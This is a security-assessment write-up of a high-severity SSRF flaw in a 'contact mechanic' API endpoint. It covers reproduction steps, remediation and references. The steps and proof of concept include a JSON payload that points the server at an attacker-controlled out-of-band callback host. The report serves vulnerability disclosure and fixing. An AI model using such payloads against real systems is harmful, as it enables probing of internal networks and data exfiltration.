# Server-Side Request Forgery (SSRF) in Contact Mechanic API

## Severity
High

## CWE
CWE-918 - Server-Side Request Forgery (SSRF)

## OWASP Mapping
OWASP API Top 10: API7 - Server Side Request Forgery (SSRF)

## Affected Endpoint
POST /workshop/api/merchant/contact_mechanic

## Description
The application is vulnerable to Server-Side Request Forgery (SSRF) in the `mechanic_api` parameter of the Contact Mechanic API.

The backend accepts a full URL from user input and makes a server-side HTTP request to that URL without proper validation or restriction. This allows an attacker to control outbound requests initiated by the server.

An attacker can abuse this behavior to make the server send requests to arbitrary external systems and potentially internal services, leading to data exposure or further exploitation depending on network configuration.

## Steps to Reproduce

1. Login as attacker account (attacker@a.com).
2. Navigate to Contact Mechanic functionality.
3. Intercept request using Burp Suite.
4. Send a normal request:
   {"mechanic_api":"https://merlin-declivitous-crowdedly.ngrok-free.dev/workshop/api/mechanic/receive_report", ...}
5. Modify the `mechanic_api` parameter to an external server:
   {"mechanic_api":"http://3ptig3p4f8xl5bfxur1jb9mublhc52tr.oastify.com", ...}
6. Forward the request.
7. Observe that the server performs an HTTP request to the attacker-controlled domain.

## Proof of Concept

Request:
POST /workshop/api/merchant/contact_mechanic

### Payload Used
{"mechanic_api":"http://3ptig3p4f8xl5bfxur1jb9mublhc52tr.oastify.com"}

### Reference
Requests:
evidence/requests/SSRF/Contact-Mechanic-SSRF.txt
evidence/requests/SSRF/normal-request.txt

### References

Responses:
{"response_from_mechanic_api":"<html><body>...</body></html>","status":200}

evidence/responses/SSRF/Contact-Mechanic-SSRF.txt
evidence/responses/SSRF/normal-request.txt

Screenshots:
evidence/screenshots/SSRF/Geniune-Request.png
evidence/screenshots/SSRF/SSRF-Test-1.png
evidence/screenshots/SSRF/SSRF-Test-2.png
evidence/screenshots/SSRF/SSRF-ReTest-1.png
evidence/screenshots/SSRF/SSRF-ReTest-2.png
evidence/screenshots/SSRF/SSRF-ReTest-3.png

## Impact

- Server-side requests can be forced to external systems
- Potential access to internal network services (intranet/localhost)
- Possible data exfiltration from internal APIs
- Can be chained with internal service discovery attacks
- Risk of sensitive infrastructure exposure depending on network segmentation

## Risk Rating
High

## Remediation

- Validate and sanitize all URL inputs strictly
- Use allowlist of approved domains for outbound requests
- Block requests to internal IP ranges (127.0.0.1, 10.0.0.0/8, etc.)
- Disable user-controlled URL fetching where not required
- Implement network-level egress filtering
- Add request timeout and logging for outbound requests

## References
- OWASP SSRF: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- CWE-918: https://cwe.mitre.org/data/definitions/918.html
